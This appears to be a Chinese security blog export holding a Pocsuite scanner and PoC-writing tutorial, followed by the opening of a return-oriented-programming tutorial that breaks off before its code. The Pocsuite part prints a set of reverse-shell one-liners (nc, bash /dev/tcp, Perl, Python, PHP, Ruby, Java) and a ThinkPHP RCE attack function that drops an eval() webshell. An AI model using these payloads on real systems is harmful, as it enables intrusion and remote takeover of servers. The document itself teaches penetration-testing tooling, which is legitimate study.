<h3 id="配置文件默认探测"><a href="#配置文件默认探测" class="headerlink" title="配置文件默认探测"></a>配置文件默认探测</h3><p>设置pocsuite.ini配置文件，命令行指定配置文件探测</p>
<h4 id="【Target】"><a href="#【Target】" class="headerlink" title="【Target】"></a>【Target】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Target]</span><br><span class="line">; target url (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)  </span><br><span class="line">url =                   ###指定探测的URL目标###</span><br><span class="line"></span><br><span class="line">; scan multiple targets given in a textual file</span><br><span class="line">url_file =              ###指定探测的URL目标文件###</span><br><span class="line"></span><br><span class="line">; load poc file from local or remote from seebug website</span><br><span class="line">poc = ecshop_rce.py     ###指定的POC文件###  </span><br><span class="line"></span><br><span class="line">; filter poc by keyword, e.g. cve-2021-22005</span><br><span class="line">poc_keyword =           ###指定的POC文件密码###</span><br></pre></td></tr></table></figure>



<h4 id="【Request】"><a href="#【Request】" class="headerlink" title="【Request】"></a>【Request】</h4><p>设置请求头部，针对某些需要登录的目标地址或自主设置HTTP请求。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Request]</span><br><span class="line">; http cookie header value</span><br><span class="line">cookie = </span><br><span class="line">; http host header value</span><br><span class="line">host = </span><br><span class="line">; http referer header value</span><br><span class="line">referer = </span><br><span class="line">; http user-agent header value (default random)</span><br><span class="line">agent = </span><br><span class="line">; use a proxy to connect to the target url</span><br><span class="line">proxy = </span><br><span class="line">; proxy authentication credentials (name:password)</span><br><span class="line">proxy_cred = </span><br><span class="line">; seconds to wait before timeout connection (default 30)</span><br><span class="line">timeout = </span><br><span class="line">; time out retrials times</span><br><span class="line">retry =</span><br><span class="line">; delay between two request of one thread</span><br><span class="line">delay = </span><br><span class="line">; extra headers (e.g. &quot;key1: value1\nkey2: value2&quot;)</span><br><span class="line">headers = </span><br></pre></td></tr></table></figure>



<h4 id="【Mode】"><a href="#【Mode】" class="headerlink" title="【Mode】"></a>【Mode】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Mode]</span><br><span class="line">; run poc with verify mode</span><br><span class="line">; run poc with attack mode</span><br><span class="line">; run poc with shell mode</span><br><span class="line">mode = verify</span><br><span class="line"></span><br><span class="line">####poc需要执行的模式分为exp和verify###</span><br></pre></td></tr></table></figure>



<h4 id="【Account】"><a href="#【Account】" class="headerlink" title="【Account】"></a>【Account】</h4><p>设置搜索引擎的账号密码或者Token进行登录请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Account]</span><br><span class="line">; telnet404 login user</span><br><span class="line">login_user =</span><br><span class="line">; telnet404 login password</span><br><span class="line">login_pass =</span><br><span class="line"></span><br><span class="line">; Shodan token</span><br><span class="line">shodan_token =</span><br><span class="line"></span><br><span class="line">; fofa user</span><br><span class="line">fofa_user =</span><br><span class="line">; fofa token</span><br><span class="line">fofa_token =</span><br><span class="line"></span><br><span class="line">; quake token</span><br><span class="line">quake_token =</span><br><span class="line"></span><br><span class="line">; Censys uid</span><br><span class="line">censys_uid =</span><br><span class="line">; Censys secret</span><br><span class="line">censys_secret =</span><br></pre></td></tr></table></figure>



<h4 id="【Modules】"><a href="#【Modules】" class="headerlink" title="【Modules】"></a>【Modules】</h4><p>指定使用的搜索引擎进行查询，dork用来设置Zoomeye等搜索引擎的搜索语句。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Modules]</span><br><span class="line">; zoomeye dork used for search</span><br><span class="line">dork =</span><br><span class="line">; zoomeye dork used for search</span><br><span class="line">dork_zoomeye =</span><br><span class="line">; shodan dork used for search</span><br><span class="line">dork_shodan =</span><br><span class="line">; censys dork used for search</span><br><span class="line">dork_censys =</span><br><span class="line">; fofa dork used for search</span><br><span class="line">dork_fofa =</span><br><span class="line">; quake dork used for search</span><br><span class="line">dork_quake =</span><br><span class="line">; max page used in search api</span><br><span class="line">max_page = 1</span><br><span class="line">; search type used in zoomeye api, web or host</span><br><span class="line">search_type = host</span><br><span class="line">; seebug keyword used for search</span><br><span class="line">vul_keyword =</span><br><span class="line">; seebug ssvid number for target poc</span><br><span class="line">ssvid =</span><br><span class="line">; connect back host for target poc in shell mode</span><br><span class="line">connect_back_host =</span><br><span class="line">; connect back port for target poc in shell mode</span><br><span class="line">connect_back_port =</span><br><span class="line">; enable TLS listener in shell mode</span><br><span class="line">enable_tls_listener = False</span><br><span class="line">; compare popular web search engines</span><br><span class="line">comparison = False</span><br><span class="line">; whether dork is in base64 format</span><br><span class="line">dork_b64 = False</span><br></pre></td></tr></table></figure>



<h4 id="【Optimization】"><a href="#【Optimization】" class="headerlink" title="【Optimization】"></a>【Optimization】</h4><p>设置可选选项参数，如线程等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Optimization]</span><br><span class="line">; load plugins to execute</span><br><span class="line">plugins =</span><br><span class="line">; user defined poc scripts path</span><br><span class="line">pocs_path =</span><br><span class="line">; max number of concurrent network requests (default 1)</span><br><span class="line">threads = 1</span><br><span class="line">; automatically choose defaut choice without asking</span><br><span class="line">batch = </span><br><span class="line">; check install_requires</span><br><span class="line">check_requires = False</span><br><span class="line">; activate quiet mode, working without logger</span><br><span class="line">quiet = False</span><br><span class="line">; hiden sensitive information when published to the network</span><br><span class="line">ppt = False</span><br><span class="line">; use scapy capture flow</span><br><span class="line">pcap = False</span><br><span class="line">; export suricata rules, default export request and response</span><br><span class="line">rule = False</span><br><span class="line">; only export suricata request rule</span><br><span class="line">rule_req = False</span><br><span class="line">; specify the name of the export rule file</span><br><span class="line">rule_filename =</span><br></pre></td></tr></table></figure>



<p>执行命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 cli.py -c ../pocsuite.ini</span><br></pre></td></tr></table></figure>

<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207153115935.png" class title="image-20220207153115935">



<h2 id="插件工具"><a href="#插件工具" class="headerlink" title="插件工具"></a>插件工具</h2><p>通过–plugins在后面指定插件名称，多个插件可以用,分割。</p>
<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207153517654.png" class title="image-20220207153517654">



<p>例如</p>
<p>–plugins html_report将会生成HTML报表格式文档。</p>
<p>–plugins file_record将会生成HTML报表格式文档.</p>
<h2 id="Poc编写"><a href="#Poc编写" class="headerlink" title="Poc编写"></a>Poc编写</h2><p>这里以thinkphp_rce.py举例说明。</p>
<p>命名规则:PoC命名分成3个部分组成<strong>漏洞应用名_版本号__漏洞类型名称</strong> 文件名称中的所有字母改成小写.</p>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/qq_34640691/article/details/109119942">(58条消息) 关于pocsuite下的pocs代码分析_willow_liang的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/weixin_45007073/article/details/113094045">(58条消息) POC和EXP脚本_平凡的学者的博客-CSDN博客_exp脚本</a></p>
<p><a href="https://blog.csdn.net/weixin_44426869/article/details/103962994">(58条消息) 使用Pocsuite3框架并编写简单PoC例子_情感博主V-CSDN博客_pocsuite3使用</a></p>
<h3 id="方法格式使用"><a href="#方法格式使用" class="headerlink" title="方法格式使用"></a>方法格式使用</h3><p>编写Poc主要分为Poc介绍信息模块，漏洞检测模块，漏洞利用模块，返回结果模块。</p>
<p>开头是对该Poc的简介，关于创建的时间、作者的名字，针对该Poc的漏洞信息和执行判断结果。</p>
<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207154854764.png" class title="image-20220207154854764">



<h4 id="def-options-self"><a href="#def-options-self" class="headerlink" title="def_options(self)"></a>def_options(self)</h4><p>该函数针对RCE类POC，需要执行相关命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def _options(self):</span><br><span class="line">      o = OrderedDict()   ##实例化OrdereDict类对象o</span><br><span class="line">      payload = &#123;</span><br><span class="line">          ##调用REVERSE_PAYLOAD类的NC属性和BASH属性</span><br><span class="line">          &quot;nc&quot;: REVERSE_PAYLOAD.NC,</span><br><span class="line">          &quot;bash&quot;: REVERSE_PAYLOAD.BASH,</span><br><span class="line">      &#125;</span><br><span class="line">      o[&quot;command&quot;] = OptDict(selected=&quot;bash&quot;, default=payload)</span><br><span class="line">      ##调用OPtDict()函数将bash字符串传给o的command键值</span><br><span class="line">      </span><br><span class="line">      return o</span><br></pre></td></tr></table></figure>



<p>上述代码中涉及到的相关代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">REVERSE_PAYLOAD</span>:</span></span><br><span class="line">    NC = <span class="string">&quot;&quot;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &#123;0&#125; &#123;1&#125; &gt;/tmp/f&quot;&quot;&quot;</span></span><br><span class="line">    NC2 = <span class="string">&quot;&quot;&quot;nc -e /bin/sh &#123;0&#125; &#123;1&#125;&quot;&quot;&quot;</span></span><br><span class="line">    NC3 = <span class="string">&quot;&quot;&quot;rm -f /tmp/p;mknod /tmp/p p &amp;&amp; nc &#123;0&#125; &#123;1&#125; 0/tmp/p&quot;&quot;&quot;</span></span><br><span class="line">    BASH = <span class="string">&quot;&quot;&quot;bash -c &#x27;sh -i &gt;&amp; /dev/tcp/&#123;0&#125;/&#123;1&#125; 0&gt;&amp;1&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    BASH2 = <span class="string">&quot;&quot;&quot;bash -c &#x27;sh -i &amp;gt;&amp;amp; /dev/tcp/&#123;0&#125;/&#123;1&#125; 0&amp;gt;&amp;amp;1&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    TELNET = <span class="string">&quot;&quot;&quot;rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet &#123;0&#125; &#123;1&#125; 0/tmp/p&quot;&quot;&quot;</span></span><br><span class="line">    PERL = <span class="string">&quot;&quot;&quot;perl -e &#x27;use Socket;$i=&quot;&#123;0&#125;&quot;;$p=&#123;1&#125;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;&#125;;&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    PYTHON = <span class="string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&#123;0&#125;&quot;,&#123;1&#125;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    PHP = <span class="string">&quot;&quot;&quot;php -r &#x27;$sock=fsockopen(&quot;&#123;0&#125;&quot;,&#123;1&#125;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    RUBY = <span class="string">&quot;&quot;&quot;ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;&#123;0&#125;&quot;,&#123;1&#125;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    JAVA = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    r = Runtime.getRuntime()</span></span><br><span class="line"><span class="string">    p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/&#123;0&#125;/&#123;1&#125;;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span></span><br><span class="line"><span class="string">    p.waitFor()</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OptDict</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, require=<span class="literal">False</span>, selected=<span class="literal">False</span>, default=&#123;&#125;</span>):</span></span><br><span class="line">        <span class="comment"># super().__init__(default, &#x27;&#x27;, require)</span></span><br><span class="line">        self.default = &#123;&#125;</span><br><span class="line">        b = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> default.items():</span><br><span class="line">            self.default[k] = v</span><br><span class="line">            b += <span class="string">&quot;&#123;k&#125;:&#123;v&#125;\n&quot;</span>.<span class="built_in">format</span>(k=k, v=v)</span><br><span class="line">        self.selected = selected</span><br><span class="line">        self.require = require</span><br><span class="line">        self.<span class="built_in">type</span> = <span class="string">&quot;Dict&quot;</span></span><br><span class="line">        self.__set__(<span class="string">&quot;&quot;</span>, selected)</span><br><span class="line"></span><br><span class="line">        self.description = <span class="string">&quot;&#123;&#125;\nYou can select &#123;&#125; ,default:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(b,</span><br><span class="line">                                                                      <span class="built_in">repr</span>(self.default.keys()),self.selected)</span><br></pre></td></tr></table></figure>



<h4 id="def-verify-self"><a href="#def-verify-self" class="headerlink" title="def _verify(self)"></a>def _verify(self)</h4><p>_verify()漏洞检测函数为Poc中最重要的函数，检测漏洞是否存在的逻辑关系。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def _verify(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        p = self._check(self.url)</span><br><span class="line">        if p:</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;] = &#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = p[0]</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = p[1]</span><br><span class="line"></span><br><span class="line">        return self.parse_output(result)</span><br></pre></td></tr></table></figure>



<p>当该poc为exp模块时，_verify()为固定写法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def _verify(self):	#exp模块固定写法</span><br><span class="line">       output = Output(self)</span><br><span class="line">       result = &#123;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="def-attack-self"><a href="#def-attack-self" class="headerlink" title="def _attack(self)"></a>def _attack(self)</h4><p>该方法为攻击模式的方法，编写对该漏洞利用的代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def _attack(self):</span><br><span class="line">       result = &#123;&#125;</span><br><span class="line">       filename = random_str(6) + &quot;.php&quot;</span><br><span class="line">       webshell = r&#x27;&#x27;&#x27;&lt;?php echo &quot;green day&quot;;@eval($_POST[&quot;pass&quot;]);?&gt;&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">       p = self._check(self.url)</span><br><span class="line">       if p:</span><br><span class="line">           data = p[1]</span><br><span class="line">           data[&quot;vars[1][]&quot;] = &quot;echo%20%27&#123;content&#125;%27%20&gt;%20&#123;filename&#125;&quot;.format(filename=filename,</span><br><span class="line">                                                                                content=quote(webshell))</span><br><span class="line">           data[&quot;vars[0]&quot;] = &quot;system&quot;</span><br><span class="line">           vulurl = self.url + p[0]</span><br><span class="line">           requests.post(vulurl, data=data)</span><br><span class="line">           r = requests.get(self.url + &quot;/&quot; + filename)</span><br><span class="line">           if r.status_code == 200 and &quot;green day&quot; in r.text:</span><br><span class="line">               result[&#x27;ShellInfo&#x27;] = &#123;&#125;</span><br><span class="line">               result[&#x27;ShellInfo&#x27;][&#x27;URL&#x27;] = self.url + &quot;/&quot; + filename</span><br><span class="line">               result[&#x27;ShellInfo&#x27;][&#x27;Content&#x27;] = webshell</span><br><span class="line">       if not result:</span><br><span class="line">           vulurl = self.url + r&quot;/index.php?s=index/\think\template\driver\file/write&amp;cacheFile=&#123;filename&#125;&amp;content=&#123;content&#125;&quot;</span><br><span class="line">           vulurl = vulurl.format(filename=filename, content=quote(webshell))</span><br><span class="line">           requests.get(vulurl)</span><br><span class="line">           r = requests.get(self.url + &quot;/&quot; + filename)</span><br><span class="line">           if r.status_code == 200 and &quot;green day&quot; in r.text:</span><br><span class="line">               result[&#x27;ShellInfo&#x27;] = &#123;&#125;</span><br><span class="line">               result[&#x27;ShellInfo&#x27;][&#x27;URL&#x27;] = self.url + &quot;/&quot; + filename</span><br><span class="line">               result[&#x27;ShellInfo&#x27;][&#x27;Content&#x27;] = webshell</span><br><span class="line"></span><br><span class="line">       return self.parse_output(result)</span><br></pre></td></tr></table></figure>



<p>若该poc没有攻击模式，该方法可返回_verify()方法或者不写该方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def _attack(self):			#注意:若该poc没有攻击模式，在_attack函数下，return self._verify(),不用再写_attack()</span><br><span class="line">return self._verify()</span><br></pre></td></tr></table></figure>



<h4 id="def-parse-output-self-result"><a href="#def-parse-output-self-result" class="headerlink" title="def parse_output(self, result)"></a>def parse_output(self, result)</h4><p>使用Output()函数判断探测结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">def parse_output(self, result):</span><br><span class="line">    output = Output(self)</span><br><span class="line">    if result:</span><br><span class="line">        output.success(result)</span><br><span class="line">    else:</span><br><span class="line">        output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">    return output</span><br><span class="line">register_poc(DemoPOC)</span><br></pre></td></tr></table></figure>



<p>上述POC中涉及到的Output类代码，通过isinstance()函数判断传入的result是否为字典类型。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Output(object):</span><br><span class="line">    def __init__(self, poc=None):</span><br><span class="line">        self.error_msg = tuple()</span><br><span class="line">        self.result = &#123;&#125;</span><br><span class="line">        self.status = OUTPUT_STATUS.FAILED</span><br><span class="line">        if poc:</span><br><span class="line">            self.url = poc.url</span><br><span class="line">            self.mode = poc.mode</span><br><span class="line">            self.vul_id = poc.vulID</span><br><span class="line">            self.name = poc.name</span><br><span class="line">            self.app_name = poc.appName</span><br><span class="line">            self.app_version = poc.appVersion</span><br><span class="line">            self.error_msg = poc.expt</span><br><span class="line">    def success(self, result):</span><br><span class="line">        assert isinstance(result, dict)</span><br><span class="line">        self.status = OUTPUT_STATUS.SUCCESS</span><br><span class="line">        self.result = result</span><br><span class="line"></span><br><span class="line">    def fail(self, error=&quot;&quot;):</span><br><span class="line">        assert isinstance(error, str)</span><br><span class="line">        self.status = OUTPUT_STATUS.FAILED</span><br><span class="line">        self.error_msg = (0, error)</span><br><span class="line"></span><br><span class="line">class OUTPUT_STATUS:</span><br><span class="line">    SUCCESS = 1</span><br><span class="line">    FAILED = 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在使用Pocsuite的时候，我们可以用<code>--verify</code>参数来调用<code>_verify</code>方法，用<code>--attack</code>参数来调用<code>_attack</code>方法。</p>
<h3 id="库的使用"><a href="#库的使用" class="headerlink" title="库的使用"></a>库的使用</h3><p>Python库引用模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pocsuite.api.poc import register</span><br><span class="line">from pocsuite.api.poc import Output, POCBase</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line">from requests.auth import HTTPBasicAuth</span><br></pre></td></tr></table></figure>



<h4 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h4><p>pocsuite 中自带经过改装的 req，from pocsuite.api.request import req，pocsuite 中的 req 可以使用随机的 UA</p>
<p>requests库的七个主要方法:</p>
<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207183053786.png" class title="image-20220207183053786">



<p>对于在编写poc中常用到的几个request库的函数为get(),post()和put(),所有的函数调用格式相同。</p>
<p>函数格式如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r=requests.get(url,params,**kwargs)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url: 需要爬取的网站地址。</span><br><span class="line"></span><br><span class="line">params: 翻译过来就是参数， url中的额外参数，字典或者字节流格式，可选。</span><br><span class="line"></span><br><span class="line">**kwargs : 12个控制访问的参数</span><br><span class="line">params：字典或字节序列， 作为参数增加到url中,使用这个参数可以把一些键值对以?key1=value1&amp;key2=value2的模式增加到url中</span><br><span class="line">例如：kv = &#123;&#x27;key1&#x27;:&#x27; values&#x27;, &#x27;key2&#x27;: &#x27;values&#x27;&#125; </span><br><span class="line">r = requests.get(&#x27;http:www.python123.io/ws&#x27;, params=kw)</span><br><span class="line"></span><br><span class="line">data：字典，字节序或文件对象，重点作为向服务器提供或提交资源是提交，，作为request的内容，与params不同的是，data提交的数据并不放在url链接里， 而是放在url链接对应位置的地方作为数据来存储。，它也可以接受一个字符串对象。(request.post()函数)</span><br><span class="line"></span><br><span class="line">json：json格式的数据， json合适在相关的html，http相关的web开发中非常常见， 也是http最经常使用的数据格式， 他是作为内容部分可以向服务器提交。</span><br><span class="line">例如：kv = &#123;&#x27;key1&#x27;: &#x27;value1&#x27;&#125; </span><br><span class="line">r = requests.post(&#x27;http://python123.io/ws&#x27;, json=kv)</span><br><span class="line"></span><br><span class="line">headers：字典是http的相关语，对应了向某个url访问时所发起的http的头i字段， 可以用这个字段来定义http的访问的http头，可以用来模拟任何我们想模拟的浏览器来对url发起访问。</span><br><span class="line">例子： hd = &#123;&#x27;user-agent&#x27;: &#x27;Chrome/10&#x27;&#125; </span><br><span class="line">r = requests.post(&#x27;http://python123.io/ws&#x27;, headers=hd)</span><br><span class="line"></span><br><span class="line">cookies：字典或CookieJar，指的是从http中解析cookie</span><br><span class="line"></span><br><span class="line">auth：元组，用来支持http认证功能</span><br><span class="line"></span><br><span class="line">files：字典， 是用来向服务器传输文件时使用的字段。</span><br><span class="line">例子：fs = &#123;&#x27;files&#x27;: open(&#x27;data.txt&#x27;, &#x27;rb&#x27;)&#125; </span><br><span class="line">r = requests.post(&#x27;http://python123.io/ws&#x27;, files=fs)</span><br><span class="line"></span><br><span class="line">timeout: 用于设定超时时间， 单位为秒，当发起一个get请求时可以设置一个timeout时间， 如果在timeout时间内请求内容没有返回， 将产生一个timeout的异常。</span><br><span class="line"></span><br><span class="line">proxies：字典， 用来设置访问代理服务器。</span><br><span class="line"></span><br><span class="line">allow_redirects: 开关， 表示是否允许对url进行重定向， 默认为True。</span><br><span class="line"></span><br><span class="line">stream: 开关， 指是否对获取内容进行立即下载， 默认为True。</span><br><span class="line"></span><br><span class="line">verify：开关， 用于认证SSL证书， 默认为True。</span><br><span class="line"></span><br><span class="line">cert： 用于设置保存本地SSL证书路径</span><br></pre></td></tr></table></figure>



<p>其中response对象有以下属性：</p>
<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207184854731.png" class title="image-20220207184854731">



<p><strong>requests库的异常</strong></p>
<p>注意<code>requests</code>库有时会产生异常，比如网络连接错误、<code>http</code>错误异常、重定向异常、请求<code>url</code>超时异常等等。所以我们需要判断<code>r.status_codes</code>是否是200，在这里我们怎么样去捕捉异常呢？</p>
<p>这里我们可以利用<code>r.raise_for_status()</code> 语句去捕捉异常，该语句在方法内部判断<code>r.status_code</code>是否等于200，如果不等于，则抛出异常。</p>
<p>于是在这里我们有一个爬取网页的通用代码框架：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    r=requests.get(url,timeout=30)#请求超时时间为30秒</span><br><span class="line">    r.raise_for_status()#如果状态不是200，则引发异常</span><br><span class="line">    r.encoding=r.apparent_encoding #配置编码</span><br><span class="line">    return r.text</span><br><span class="line">except:</span><br><span class="line">    return &quot;产生异常&quot; </span><br></pre></td></tr></table></figure>



<h2 id="Windows下Pocsuite写日志URL带冒号报错"><a href="#Windows下Pocsuite写日志URL带冒号报错" class="headerlink" title="Windows下Pocsuite写日志URL带冒号报错"></a>Windows下Pocsuite写日志URL带冒号报错</h2><h3 id="报错描述"><a href="#报错描述" class="headerlink" title="报错描述"></a>报错描述</h3><p>Windows平台使用Pocsuite，当输入的url带有<code>:</code>的时会报错，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[WARNING] unable to create output directory </span><br><span class="line">         &#x27;C:\Users\Administrator\.pocsuite\output\127.0.0.1:8080&#x27;</span><br></pre></td></tr></table></figure>



<h3 id="错误分析"><a href="#错误分析" class="headerlink" title="错误分析"></a>错误分析</h3><p>原来保存日志记录会选取<code>C:\Users\Administrator\.pocsuite\output\</code>拼接上url地址，而windows下文件名不允许含有<code>:</code>，所以才会报错。</p>
<p>所以，不论URL是<code>http://</code>还是带有冒号都会报错，看来pocsuite这边在创建这个文件名的时候名没有检查文件名字是否还有特殊符号呀。</p>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>手动改代码解决问题：反向追踪哪个文件做了创建文件夹的操作。</p>
<p>经查找，发现该操作代码存在于<code>pocsuite\lib\controller\controller.py</code>文件。</p>
<p>从131行代码开始，定义了一个<code>_setRecordFiles()</code>函数，该函数会创建文件夹。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def _setRecordFiles():</span><br><span class="line">    for (target, pocname, pocid, component, version, status, r_time, result) in kb.results:</span><br><span class="line">        if type(status) != str:</span><br><span class="line">            status = status[1]</span><br><span class="line">            target=target.replace(&quot;:&quot;,&quot;_&quot;) #这里添加了一行替换代码</span><br><span class="line">        outputPath = os.path.join(getUnicode(paths.POCSUITE_OUTPUT_PATH), normalizeUnicode(getUnicode(target)))</span><br></pre></td></tr></table></figure>



<p>可以发现<code>_setRecordFiles()</code>函数从<code>kb.results</code>这个数据实例里面取值。</p>
<p>我们用<code>target=target.replace(&quot;:&quot;,&quot;_&quot;)</code>来将<code>:</code>替换成<code>&quot;_&quot;</code>，问题解决。</p>
]]></content>
      <categories>
        <category>内功心法</category>
        <category>Poc编写</category>
      </categories>
      <tags>
        <tag>-Pocsuite扫描器 -Poc编写</tag>
      </tags>
  </entry>
  <entry>
    <title>ROP的基本原理和实战教学</title>
    <url>/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/</url>
    <content><![CDATA[<h1 id="ROP的基本原理和实战教学"><a href="#ROP的基本原理和实战教学" class="headerlink" title="ROP的基本原理和实战教学"></a>ROP的基本原理和实战教学</h1><p>ROP的全称为Return-oriented   programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。我们可以发现栈溢出的控制点是ret处，那么ROP的核心思想就是<strong>利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值</strong>，从而控制程序的执行流程。</p>
<h2 id="二进制程序保护机制"><a href="#二进制程序保护机制" class="headerlink" title="二进制程序保护机制"></a>二进制程序保护机制</h2><p><strong>RELRO：</strong>Relocation Read-Only，<strong>重定位表只读</strong>。设置符号重定向表格为只读或在程序启动时就解析并绑 定所有动态符号，从而减少对 GOT 表的攻击。如果 RELRO 为“Partial RELRO”，说明对 GOT 表具有写权限。</p>
<p>**Stack canary:**函数开始执行时先在栈帧基址 (如 EBP 位置) 附近插入 cookie 信息（标记），当函数返回后验证 cookie 信息是否合法， 如果不合法就停止程序运行。攻击者在执行溢出时，在覆盖返回地址的时候往往也会覆盖 cookie 信息，导致栈保护检查失败从而阻止 shellcode 的执行。</p>
<p><strong>ASLR:<strong>Address Space Layout Randomization，</strong>地址空间布局随机化。</strong>通过对堆、栈、共享库等加载地址随机化，增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置。随机化影响的是程序加载的 基地址，页内偏移不会发生变化。</p>
<p><strong>PIE: <strong>Position Independent Executable，</strong>地址无关的可执行文件</strong>，每次加载程序时都变换 text、 data、bss 等段的加载基地址，使得攻击者难以定位相应的基地址执行溢出。</p>
<p><strong>NX:</strong>  NX(No-execute)是一种DEP数据执行保护技术，基本原理是将数据所在的内存标识为不可执行，当程序溢出成功后转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常不去执行恶意代码。</p>
<h2 id="为什么要ROP？"><a href="#为什么要ROP？" class="headerlink" title="为什么要ROP？"></a>为什么要ROP？</h2><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。所以就需要ROP对其进行绕过。</p>
<h2 id="ROP靶场"><a href="#ROP靶场" class="headerlink" title="ROP靶场"></a>ROP靶场</h2><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a><strong>ret2shellcode</strong></h3><p>将返回地址覆盖到我们插入shellcode的首地址</p>
<p>首先检测程序开启保护，防护措施几乎为0.</p>
<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231118195205602.png" class title="image-20231118195205602">

<p>反编译获取其源代码如下</p>
